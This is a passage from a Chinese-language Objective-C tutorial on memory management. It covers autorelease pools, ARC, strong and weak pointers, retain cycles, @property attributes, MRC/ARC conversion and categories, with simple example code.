autorelease];</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>​     这样,我们直接调用类方法.就可以得到1个已经被autorelease过的对象.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@autoreleasepool</span><br><span class="line">&#123;</span><br><span class="line">    Person *p1 = [Person person];</span><br><span class="line">    //这个p1对象已经被autorelase过了.不需要再调用autorelase</span><br><span class="line">    //这个p1对象就被存储到当前自动释放池之中.</span><br><span class="line">&#125;//当自动释放池结束.就会为存储在其中的p1对象发送release消息.</span><br></pre></td></tr></table></figure><p><strong>5.实际上Apple的框架中的类也是遵守这个规范的.</strong></p><p>通过类方法创建的对象都是已经被autorelease过的了.</p><p>所以,我们也要遵守这个规范. 类方法返回的对象也要被autorealse过.</p><p>以后,我们凡事创建对象是调用类方法创建的对象 这个对象已经是被autorelease过的了.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"> */</span><br><span class="line">#import &lt;Foundation/Foundation.h&gt;</span><br><span class="line">#import &quot;Person.h&quot;</span><br><span class="line">#import &quot;Pig.h&quot;</span><br><span class="line">int main(int argc, const char * argv[])</span><br><span class="line">&#123;</span><br><span class="line">@autoreleasepool</span><br><span class="line">&#123;</span><br><span class="line">    Pig *p1 = [Pig pigWithName:@&quot;猪猪&quot; andAge:1 andWeight:100];</span><br><span class="line">    NSString *str0 = [[[NSString alloc] initWithFormat:@&quot;jack&quot;] autorelease];</span><br><span class="line">    NSString *str1 = [NSString stringWithFormat:@&quot;jack&quot;];</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">//    NSString *str = [NSString alloc] initWithFormat:&lt;#(nonnull NSString *), ...#&gt;;</span><br><span class="line">//    [NSString string]; </span><br><span class="line">//    </span><br><span class="line">//    Pig *p1 = [[Pig alloc] initWithName:@&quot;八戒&quot; andAge:2 andWeight:260];</span><br><span class="line">//    </span><br><span class="line">//    Pig *p2 = [Pig pigWithName:@&quot;八戒&quot; andAge:2 andWeight:260];</span><br><span class="line">//    </span><br><span class="line"> </span><br><span class="line">//    @autoreleasepool</span><br><span class="line">//    &#123;</span><br><span class="line">//        Person *p1 = [[[Person alloc] init] autorelease];</span><br><span class="line">//</span><br><span class="line">//        Car *c1 = [[[Car alloc] init] autorelease];</span><br><span class="line">//        </span><br><span class="line">//        p1.car = c1;</span><br><span class="line">//    &#125;</span><br><span class="line">//    </span><br><span class="line"></span><br><span class="line">//自动释放池唯一的作用: 省略创建对象匹配的那个release</span><br><span class="line">//其他的和我们昨天讲的都是一样的.</span><br><span class="line"></span><br><span class="line">//    @autoreleasepool</span><br><span class="line">//    &#123;</span><br><span class="line">//        Person *p1 = [[[Person alloc] init] autorelease];</span><br><span class="line">//        @autoreleasepool</span><br><span class="line">//        &#123;</span><br><span class="line">//        </span><br><span class="line">//            Person *p2 = [[[Person alloc] init] autorelease];</span><br><span class="line">//            </span><br><span class="line">//            @autoreleasepool</span><br><span class="line">//            &#123;</span><br><span class="line">//                 Person *p3 = [[[Person alloc] init] autorelease];</span><br><span class="line">//            &#125;</span><br><span class="line">//            </span><br><span class="line">//        &#125;</span><br><span class="line">//        </span><br><span class="line">//        </span><br><span class="line">//    &#125;</span><br><span class="line">//    </span><br><span class="line">//    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">//    @autoreleasepool</span><br><span class="line">//    &#123;</span><br><span class="line">//        </span><br><span class="line">//        Person *p1 = [[[Person alloc] init] autorelease];//1</span><br><span class="line">//        </span><br><span class="line">//     </span><br><span class="line">//        </span><br><span class="line">//        //在自动释放池中调用同1个对象的autorelease多少次 就会降这个对象存储到自动释放池中多少词.</span><br><span class="line">    </span><br><span class="line">//        //[p1 retain];//2</span><br><span class="line">//        //[p1 autorelease];//将p1对象 存储到当前的自动释放池</span><br><span class="line">//        </span><br><span class="line">//        </span><br><span class="line">//    &#125;</span><br><span class="line"></span><br><span class="line">//    Person *p1 =  [Person new];</span><br><span class="line">//    </span><br><span class="line">//    </span><br><span class="line">//    [p1 release];</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ARC"><a href="#ARC" class="headerlink" title="ARC"></a>ARC</h3><ol><li><strong>什么是ARC</strong></li></ol><p>  Automatic Reference Counting，自动引用计数. 即ARC. </p><p>  顾名思义:系统自动的帮助我们去计算对象的引用计数器的值,</p><p>  可以说是WWDC2011和iOS5引入的最大的变革和最激动人心的变化. </p><p>  ARC是新的LLVM3.0编译器的一项特性,使用ARC,可以说一举解决了广大iOS开着所憎恨的手动管理内存的麻烦.</p><p>  在程序中使用ARC非常简单,只需要像往常那样编写代码. </p><p>  只不过永远不要写retain、release、autorelease 永远要手动的调用 dealloc 这三个关键字就好,这是ARC的最基本的原则.</p><p>  当ARC开启时, 编译器会自动的在合适的地方插入retain、release、autorelase代码. </p><p>  编译器自动为对象做引用计数. 而作为开发者,完全不需要担心编译器会做错(除非开发者自己错用了ARC).</p><p>  需要特别注意的是: ARC是编译器机制. 在编译器编译代码的时候,会在适时的位置加入retain、release和autorealse代码.</p><ol start="2"><li><strong>ARC机制下,对象何时被释放</strong></li></ol><p>  本质: 对象的引用计数器为0的时候,自动释放.</p><p>  表象: 只要没有强指针指向这个对象,这个对象就会立即回收.</p><ol start="3"><li><strong>强指针与弱指针.</strong></li></ol><p>  强指针: 默认情况下,我们声明1个指针 这个指针就是1个强指针. </p><p>​      我们也可以使用__strong来显示的声明这是1个强指针.</p><p>​      </p><p>​      Person *p1; 这是1个强指针. 指针默认情况下都是1个强指针</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__strong Person *p2; 这也是1个强指针.使用__strong来显示的声明强指针.</span><br></pre></td></tr></table></figure><p>  弱指针: 使用__weak标识的指针就叫做弱指针.</p><p>​      </p><p>  无论是强指针还是弱指针,都是指针,都可以用来存储地址,这1点没有任何区别 。</p><p>  都可以通过这个指针访问对象的成员.</p><p>  唯一的区别就是在ARC模式下.他们用来作为回收对象的基准. </p><p>  如果1个对象没有任何强类型的指针指向这个对象的时候,对象就会被立即自动释放</p><ol start="4"><li><strong>确认程序是否开启ARC机制.</strong></li></ol><p>  1).默认情况下,Xcode开启ARC机制.</p><p>  2).ARC机制下,不允许调用retain、relase、retainCount、autorelease方法.</p><p>  3).众所周知，iOS开发的时候，使用ARC的话，dealloc函数是不需要实现的，写了反而会出错。如果需要重写dealloc(在画面关闭的时候，需要把ViewController的某些资源释放)。在dealloc中 不允许[super dealloc];dealloc在ARC下的作用就是释放 系统无法释放的该对象占用的资源,或者其他对象对该对象的引用</p><ol start="5"><li><strong>演示第1个ARC案例</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int main(int argc, const char * argv[])</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  @autoreleasepool</span><br><span class="line">   &#123;</span><br><span class="line">     Person *p1 = [Person new];//p1是1个强指针.</span><br><span class="line">    //因为我们说过,每1个指针变量默认情况下都是1个强指针变量.</span><br><span class="line">    NSLog(@&quot;------&quot;);</span><br><span class="line">   &#125;//当执行到这里的时候.p1指针被回收,那么Person对象就没有任何</span><br><span class="line">   //强指针指向它了. 对象就在这被回收.</span><br><span class="line">   return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ARC下单个对象内存管理"><a href="#ARC下单个对象内存管理" class="headerlink" title="ARC下单个对象内存管理"></a>ARC下单个对象内存管理</h3><ol><li><p>ARC下的单个对象的内存管理.</p><p>在ARC的机制下: 当1个对象没有任何的强指针指向它的时候 这个对象就会被立即回收.</p><p> 1). <strong>当指向对象的所有的强指针被回收的时候,对象就会被立即回收.</strong></p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int main(int argc, const char * argv[])</span><br><span class="line">&#123;</span><br><span class="line">    @autoreleasepool</span><br><span class="line">    &#123;</span><br><span class="line">       Person *p1 = [Person new];//p1是1个强指针.</span><br><span class="line">       Person *p2 = p1;//p2也是个强指针.p1和p2都指向Person对象.</span><br><span class="line">       //因为我们说过,每1个指针变量默认情况下都是1个强指针变量.</span><br><span class="line">       NSLog(@&quot;------&quot;);</span><br><span class="line">    &#125;//当执行到这里的时候.p1指针被回收,p2指针也被回收.那么Person对象就没有任何</span><br><span class="line">    //强指针指向它了. 对象就在这被回收.</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 2).<strong>将所有指向对象的强指针赋值为nil的时候.对象就会被立即回收.</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int main(int argc, const char * argv[])</span><br><span class="line">&#123;</span><br><span class="line">    @autoreleasepool</span><br><span class="line">    &#123;</span><br><span class="line">        Person *p1 = [Person new];//p1是1个强指针.</span><br><span class="line">        //因为我们说过,每1个指针变量默认情况下都是1个强指针变量.</span><br><span class="line">        </span><br><span class="line">        p1 = nil;//当执行到这句话的时候.p1赋值为nil.</span><br><span class="line">        //p1指针不再执行Person对象.</span><br><span class="line">        //Person对象没有被任何的指针所指向,所以.Person对象在这里被释放.</span><br><span class="line">        NSLog(@&quot;------&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 这两种情况就叫做没有任何强指针指向对象.<br> 1). <strong>指向对象的所有强指针被回收掉</strong><br> 2). <strong>指向对象的所有的强指针赋值为nil</strong></p><ol start="2"><li><p>强指针与弱指针.</p><p>1). <strong>强指针与弱指针的声明.</strong></p><p> 默认情况下,所有的指针都是强类型的,也就是说我们之前声明的指针变量都是强类类型的</p><p> p1指针是强类型的,因为默认情况下指针都是强类型的.<br> Person *p1 = [[Person alloc] init];</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">不过我们可以使用__strong来显示的标识指针是强类型指针.</span><br><span class="line">__strong Person *p2 = [Person new];</span><br><span class="line">这个时候p2指针类型是强指针类型的.其实写不写__strong都是强类型的指针</span><br><span class="line">指针类型也可以是弱指针类型.</span><br><span class="line">使用__weak标识指针的类型是弱类型指针.</span><br><span class="line">__weak Person *p3 = p2;</span><br><span class="line">这个时候,p3指针就是1个弱类型的指针. p3弱指针也指向p2指针指向的对象.</span><br></pre></td></tr></table></figure><p>在操作对象的时候,通过强指针或者弱指针都可以操作,没有任何区别.</p></li></ol><p>2). <strong>ARC模式下的对象回收标准</strong></p><p> ARC机制下释放1个对象的标准是: 没有任何强指针指向对象的时候,对象就会被释放.<br> 如果这个时候有弱指针指向,也会被释放.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">int main(int argc, const char * argv[])</span><br><span class="line">&#123;</span><br><span class="line">    @autoreleasepool</span><br><span class="line">    &#123;</span><br><span class="line">        //使用__strong来标识p1指针是强类型的,其实不写__strong也是强类型的.</span><br><span class="line">        __strong Person *p1 = [[Person alloc] init];</span><br><span class="line">        </span><br><span class="line">        //使用__weak标识指针p2的类型是弱类型指针.</span><br><span class="line">        __weak Person *p2 = p1;</span><br><span class="line">        //这个时候,p2指针和p1指针都指向Person对象.</span><br><span class="line">        </span><br><span class="line">        //这个时候如果设置p1的值为nil</span><br><span class="line">        p1 = nil;</span><br><span class="line">        //这个时候Person对象只有被1个弱指针p2指向,没有任何强指针指向</span><br><span class="line">        //所以Person对象在这里被回收.</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 3).<strong>最重要的1点:不能创建对象用1个弱指针存储这个对象的指针.</strong><br> 这样的话,刚创建出来的对象,就没有任何强指针指向,创建出来就会被回收.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int main(int argc, const char * argv[])</span><br><span class="line">&#123;</span><br><span class="line">    @autoreleasepool</span><br><span class="line">    &#123;</span><br><span class="line">        //创建1个对象,将这个对象的地址赋值给1个弱指针</span><br><span class="line">        //后果就是创建出来的这个对象没有被任何强指针指向.</span><br><span class="line">        //刚创建出来就会被释放.</span><br><span class="line">        __weak Person *p1 = [[Person alloc] init];</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 4). <strong>在ARC机制下. 当对象被回收的时候. 原来指向这个对象的弱指针会被自动设置为nil</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"> */</span><br><span class="line">#import &lt;Foundation/Foundation.h&gt;</span><br><span class="line">#import &quot;Person.h&quot;</span><br><span class="line">int main(int argc, const char * argv[])</span><br><span class="line">&#123;  </span><br><span class="line">  //  [Person new];</span><br><span class="line">//    __weak Person *p2 = p1;</span><br><span class="line">//    </span><br><span class="line">//    p1 = nil;  </span><br><span class="line">//    [p2 sayHi];//这个地方报错.  </span><br><span class="line">//    NSLog(@&quot;~~~~~~&quot;);    </span><br><span class="line">//    __weak Person *p1 = [[Person alloc] init];   </span><br><span class="line">//    return 0; </span><br><span class="line">//    __strong Person *p1 = [Person new];</span><br><span class="line">//    __weak Person *p2 = p1;   </span><br><span class="line">//    p1 = nil;</span><br><span class="line">//    Person *p1 = [Person new];</span><br><span class="line">//    Person *p2 = p1;</span><br><span class="line">//    __weak Person *p3 = p2;</span><br><span class="line">//    p1 = p2 = nil;</span><br><span class="line">//    @autoreleasepool</span><br><span class="line">//    &#123;      </span><br><span class="line">//        Person *p1 = [Person new];       </span><br><span class="line">//        p1 = nil;       </span><br><span class="line">//    &#125;</span><br><span class="line">//    </span><br><span class="line">   return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ARC下多个对象内存管理"><a href="#ARC下多个对象内存管理" class="headerlink" title="ARC下多个对象内存管理"></a>ARC下多个对象内存管理</h3><ol><li><p>ARC机制下的对象的回收的标准: 当没有任何强类型的指针指向对象的时候,这个对象就会被立即回收.</p></li><li><p>强类型指针 弱类型指针.</p></li><li><p>什么情况下叫做对象没有强指针向指向.</p><p>1).  指向对象的强指针被回收.</p><p>2).  指向对象的强指针被赋值为nil</p></li><li><p>在ARC的机制下,@property参数不能使用retain</p><p>因为retain代表生成的setter方法是MRC的标准的内存管理代码.</p><p>而我们在ARC的机制下不需要这些代码.</p><p>所以,在ARC机制下的setter方法 什么都不需要做.直接赋值就可以了.</p></li><li><p>ARC机制下,我们关注的重点.</p><p>当1个类的属性是1个OC对象的时候.这个属性应该声明为强类型的还是弱类型的.</p><p>很明显,应该声明为1个强类型的.</p><p>问题来了?</p><p>如何控制@property生成的私有属性,是1个强类型的还是1个弱类型的呢?</p><p>使用参数, strong和weak</p><p>@property(nonatomic,strong)Car *car;</p><p>代表生成的私有属性_car 是1个强类型的.</p><p>@property(nonatomic,weak)Car *car;</p><p>代表生成的私有属性_car 是1个弱类型的.</p><p>如果不写,默认是strong.</p></li><li><p>使用建议.</p><p>1). 在ARC机制下.如果属性的类型是OC对象类型的.绝大多数场景下使用strong</p><p>2). 在ARC机制下.如果属性的类型不是OC对象类型的.使用assign</p><p>3).  strong和weak都是应用在属性的类型是OC对象的时候. 属性的类型不是OC对象的时候就使用assign.</p><p>在ARC机制下,将MRC下的retain换位strong</p><p>@property(nonatomic,strong)Car *car;</p><p>做的事情:</p><p>1).  生成私有属性.并且这个私有属性是strong</p><p>2).  生成getter setter方法的声明</p><p>3).  生成getter setter方法的声明</p></li></ol><p>​     setter的实现:直接赋值.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#import &lt;Foundation/Foundation.h&gt;</span><br><span class="line">#import &quot;Person.h&quot;</span><br><span class="line">int main(int argc, const char * argv[])</span><br><span class="line">&#123;</span><br><span class="line">  Person *p1 = [Person new];</span><br><span class="line">  Car *c1 = [Car new];</span><br><span class="line">  p1.car = c1;</span><br><span class="line">  c1= nil;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ARC下的循环引用"><a href="#ARC下的循环引用" class="headerlink" title="ARC下的循环引用"></a>ARC下的循环引用</h3><p><img src="https://raw.githubusercontent.com/zengxiang21/img/main/img/202204251036414.png" alt="image-20220425103628159"></p><p>当两个都是强指针时，大括号后对象内的属性有强指针，导致两个内存都不会释放</p><p> 在ARC机制下.当两个对象相互引用的时候.如果两边都使用strong 那么就会先内存泄露.</p><p> 解决方案: 1端使用strong 1端使用weak</p><figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#import <span class="meta-string">&lt;Foundation/Foundation.h&gt;</span></span></span><br><span class="line"><span class="meta">#import <span class="meta-string">&quot;Person.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> main(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> * argv[])</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">if</span>(<span class="number">1</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    Person *p1 = [Person new];</span><br><span class="line">    Book *b1 = [Book new];</span><br><span class="line">    p1.book = b1;</span><br><span class="line">    b1.owner = p1;</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Book.h</span></span><br><span class="line"><span class="meta">#import <span class="meta-string">&lt;Foundation/Foundation.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">@class</span> <span class="title">Person</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">Book</span> : <span class="title">NSObject</span></span></span><br><span class="line"><span class="keyword">@property</span>(<span class="keyword">nonatomic</span>,<span class="keyword">weak</span>)Person *owner;</span><br><span class="line"><span class="keyword">@end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Book.m</span></span><br><span class="line"><span class="meta">#import <span class="meta-string">&quot;Book.h&quot;</span></span></span><br><span class="line"><span class="class"><span class="keyword">@implementation</span> <span class="title">Book</span></span></span><br><span class="line">- (<span class="keyword">void</span>)dealloc</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">NSLog</span>(<span class="string">@&quot;书被烧了&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@end</span></span><br></pre></td></tr></table></figure><figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Person.h</span></span><br><span class="line"><span class="meta">#import <span class="meta-string">&lt;Foundation/Foundation.h&gt;</span></span></span><br><span class="line"><span class="meta">#import <span class="meta-string">&quot;Book.h&quot;</span></span></span><br><span class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">Person</span> : <span class="title">NSObject</span></span></span><br><span class="line"><span class="keyword">@property</span>(<span class="keyword">nonatomic</span>,<span class="keyword">strong</span>)Book *book;</span><br><span class="line"><span class="keyword">@end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Person.m</span></span><br><span class="line"><span class="meta">#import <span class="meta-string">&quot;Person.h&quot;</span></span></span><br><span class="line"><span class="class"><span class="keyword">@implementation</span> <span class="title">Person</span></span></span><br><span class="line">- (<span class="keyword">void</span>)dealloc</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">NSLog</span>(<span class="string">@&quot;人死了&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@end</span></span><br></pre></td></tr></table></figure><h3 id="property参数总结"><a href="#property参数总结" class="headerlink" title="@property参数总结"></a>@property参数总结</h3><ol><li><p>开发程序分为ARC和MRC</p></li><li><p>与多线程相关的参数.</p><pre><code>    atomic : 默认值 安全,但是效率低下.     nonatomic: 不安全,但是效率高.     无论在ARC还是在MRC都可以使用.     **使用建议: 无论是ARC还是MRC 都使用nonatomic**</code></pre></li><li><p>retain: </p><pre><code>    **只能用在MRC的模式下.**代表生成的setter方法是标准的内存管理代码.     当属性的类型是OC对象的时候.绝大多数情况下使用retain. **只有在出现了循环引用的时候1边retain 1边assign**</code></pre></li><li><p>assign:</p><pre><code>    **在ARC和MRC的模式下都可以使用assign.**    当属性的类型是非OC对象的时候 使用assign.</code></pre></li><li><p>strong:</p><pre><code>    **只能使用在ARC机制下. 当属性的类型是OC对象类型的时候,绝大多数情况下使用strong**     **只有出现了循环引用的时候, 1端strong 1端weak**</code></pre></li><li><p>weak:</p><pre><code>    只能使用在ARC机制下. 当属性的类型是OC对象的时候. 只有出现了循环引用的时候, 1端strong 1端weak</code></pre></li><li><p>readonly readwrite </p><pre><code>    无论是ARC还是MRC 都可以使用.</code></pre></li><li><p>setter getter 无论在ARC下还是在MRC下都可以改.</p></li></ol><p> -—————————-</p><pre><code>     在ARC机制下.原来使用retain的用strong      出现循环引用的时候. MRC: 1边retain 1边assign  ARC: 1边strong 1边weak</code></pre><h3 id="MRC-ARC转化"><a href="#MRC-ARC转化" class="headerlink" title="MRC ARC转化"></a>MRC ARC转化</h3><p><img src="https://raw.githubusercontent.com/zengxiang21/img/main/img/202204251100052.png" alt="image-20220425110052066"></p><p>Compiler Flags填写**-fno-objc-arc** ,使用的便是MRC</p><ol><li><p>有可能会遇到的问题.</p><pre><code>    程序使用的是ARC机制开发的,但是其中的某些类使用的是MRC.</code></pre></li><li><p>使用命令.  -fno-objc-arc</p></li></ol><p>将MRC程序转化为ARC</p><p>Edit——Convert——To Objective-C ARC</p><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><ol><li><p>分类.</p><pre><code>    类别、类目、category</code></pre></li><li><p>写1个学生类:类中有很多个方法.</p><pre><code>    吃 喝 拉 撒 睡.... 基本行为    学习、敲代码、写书.... 学习    玩Dota 玩LOL 玩CF.... 玩    爬山、跑步、踢足球..... 运动    ......   如果将这些方法都写在同1个类模块中.当然完全是可以的.   如果全都写在一个模块中,就显的很臃肿. 后期难以维护和管理.   默认情况下1个类独占1个模块.这个是将所有的成员都写在这1个模块中.就很男管理.   我们的想法: 那就让1个类占多个模块.将功能相似的方法定义在同1个模块中.</code></pre></li></ol><p>​            这样的好处: 方便维护和管理</p><pre><code>       如何将1个类分成多个模块呢?</code></pre><p>​        New File——Category</p><img src="https://raw.githubusercontent.com/zengxiang21/img/main/img/202204251455939.png" alt="image-20220425145456868" style="zoom:50%;" /><img src="https://raw.githubusercontent.com/zengxiang21/img/main/img/202204251455398.png" alt="image-20220425145534711" style="zoom:50%;" /><ol start="3"><li><p>分类:</p><pre><code>1). 顾名思义: 将1个类分为多个模块.2). 如何为1个类添加分类.3). 会生成1个.h 和1个.m的模块.</code></pre></li></ol><p>​     a. 模块的文件名:  本类名+分类名.h   本类名+分类名.m</p><pre><code>   4). 添加的分类也分为声明和实现.</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@interface 本类名 (分类名)</span><br><span class="line"></span><br><span class="line">@end</span><br></pre></td></tr></table></figure><p>​     代表不是新创建1个类.而是对已有的类添加1个分类. 小括弧中写上这个分类的名字.</p><p>​     因为1个类可以添加多个分类 为了区分每1个分类.所以分类要取名字.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@implementation Student (itcast)</span><br><span class="line"></span><br><span class="line">@end</span><br></pre></td></tr></table></figure><p>​     这是分类的实现.</p><ol start="4"><li><p>分类的使用.</p><ol><li>如果要访问分类中定义的成员,就要把分类的头文件引进来.</li></ol></li><li><p>分类的作用: 将1个类分为多个模块</p></li></ol><p> -——————————————-</p><p> 使用分类注意的几个地方:</p><ol><li><p>分类只能增加方法,不能增加属性</p></li><li><p>在分类之中可以写@property 但是不会自动生成私有属性. 也不会自动生成getter setter的实现.</p></li></ol><p>​    只会生成getter setter的声明.</p><p>​    所以,你就需要自己写getter 和 setter的声明. 也需要自己定义属性 这个属性就必须在本类中.</p><p> 3.在分类的方法实现中不可以直接访问本类的真私有属性(定义在本类的@implementation之中)</p><p>​    但是可以调用本类的getter setter来访问属性.</p><p>​    